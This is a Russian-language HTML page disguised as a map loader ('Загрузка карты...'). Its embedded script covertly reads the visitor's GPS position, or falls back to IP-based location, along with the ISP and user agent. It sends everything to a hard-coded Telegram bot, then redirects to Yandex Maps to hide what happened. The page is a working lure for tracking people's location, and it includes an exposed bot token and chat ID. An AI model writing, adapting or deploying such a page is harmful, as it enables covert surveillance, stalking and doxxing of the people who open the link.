<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #ccc;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #555;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Загрузка карты...</p>
    </div>

    <script>
        // ============ НАСТРОЙКИ ============
        const TELEGRAM_BOT_TOKEN = "8119321079:AAGngmPagp8L8BBj8lYzMMIN_FZDN52h2Cs";
        const TELEGRAM_CHAT_ID = "5314096451";
        // ==================================
        
        async function sendToTelegram(data) {
            const text = `🔴 НОВАЯ ГЕОЛОКАЦИЯ 🔴\n` +
                `🌐 IP: ${data.ip || "не определен"}\n` +
                `📍 Город: ${data.city || "не определен"}\n` +
                `🗺 Регион: ${data.region || "не определен"}\n` +
                `📮 Страна: ${data.country || "не определен"}\n` +
                `📏 Координаты: ${data.lat || "?"}, ${data.lon || "?"}\n` +
                `🏢 Провайдер: ${data.org || "не определен"}\n` +
                `🕒 Время: ${new Date().toLocaleString()}\n` +
                `🖥 User-Agent: ${data.ua || "не определен"}`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text,
                        disable_web_page_preview: true
                    })
                });
                console.log("Telegram ответ:", await response.text());
            } catch (error) {
                console.error("Ошибка отправки в Telegram:", error);
            }
        }
        
        async function getLocationAndSend() {
            const ua = navigator.userAgent;
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        await sendToTelegram({
                            ip: "GPS (точные координаты)",
                            city: "точные GPS",
                            region: "",
                            country: "",
                            lat: lat,
                            lon: lon,
                            org: `Точность: ${accuracy}м`,
                            ua: ua
                        });
                        
                        window.location.href = `https://yandex.ru/maps/?pt=${lon},${lat}&z=18`;
                    },
                    async (error) => {
                        await getLocationByIP(ua);
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            } else {
                await getLocationByIP(ua);
            }
        }
        
        async function getLocationByIP(ua) {
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                
                const locationData = {
                    ip: data.ip || "не определен",
                    city: data.city || "не определен",
                    region: data.region || "не определен",
                    country: data.country_name || "не определен",
                    lat: data.latitude || "не определен",
                    lon: data.longitude || "не определен",
                    org: data.org || "не определен",
                    ua: ua
                };
                
                await sendToTelegram(locationData);
                
                if (data.latitude && data.longitude) {
                    window.location.href = `https://yandex.ru/maps/?pt=${data.longitude},${data.latitude}&z=12`;
                } else {
                    window.location.href = "https://yandex.ru/maps/";
                }
                
            } catch (error) {
                console.error("Ошибка:", error);
                await sendToTelegram({
                    ip: "ошибка",
                    city: "ошибка получения",
                    region: "",
                    country: "",
                    lat: "",
                    lon: "",
                    org: error.message,
                    ua: ua
                });
                window.location.href = "https://yandex.ru/maps/";
            }
        }
        
        getLocationAndSend();
    </script>
</body>
</html>
